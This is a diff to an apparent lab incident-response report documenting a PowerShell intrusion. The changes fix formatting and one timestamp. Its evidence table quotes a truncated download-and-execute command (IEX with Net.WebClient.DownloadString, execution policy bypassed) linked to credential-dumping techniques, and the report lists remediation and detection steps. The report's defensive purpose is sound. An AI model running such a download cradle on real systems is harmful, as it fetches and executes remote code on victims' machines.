@@ -101,7 +101,7 @@ Run antivirus/malware scans to verify cleanup.
 | Registry Handle Leak        | EVENT_HIVE_LEAK from svchost.exe                                                                       |
 | User                       | EC2AMAZ-OTMH1RS\Administrator                                                                          |
 | Process                    | powershell.exe PID 3020                                                                                 |
-| Timestamp                  | 2025-06-15 18:34:52 UTC                                                                                |
+| Timestamp                  | 2025-06-17 18:34:52 UTC                                                                                |
 | Event ID                   | 4104 (PowerShell ScriptBlock Logging)                                                                  |
 | Command                    | powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString..." |
 | Technique                  | T1059.001 – PowerShell<br>T1105 – Remote File Copy<br>T1003.001 – LSASS Memory                          |
@@ -119,18 +119,18 @@ Velociraptor logs showed Event ID 4104 containing a PowerShell ScriptBlock attem
 ## Remediation Steps
 <br />1. Terminate Malicious Process:
 - Identify PID (e.g., 3020 running powershell.exe)
--Kill process via Task Manager or PowerShell
+- Kill process via Task Manager or PowerShell
 
 <br />2. Delete Registry Persistence Key:
--Path: HKU\S-1-5-...\Run\TestRunKey
--Remove via reg delete or Registry Editor
+- Path: HKU\S-1-5-...\Run\TestRunKey
+- Remove via reg delete or Registry Editor
 
 <br />3. Block PowerShell Web Downloads:
-Group Policy or Defender ASR Rule to restrict *Invoke-WebRequest* or *Net.WebClient*
+- Group Policy or Defender ASR Rule to restrict *Invoke-WebRequest* or *Net.WebClient*
 
 <br />4. YARA or Velociraptor Rule:
--Flag Event ID 4104 for downloads from http://*
-Monitor Registry changes to \Run\ keys
+- Flag Event ID 4104 for downloads from http://*
+- Monitor Registry changes to \Run\ keys
 
 ## Detection Enhancement
 
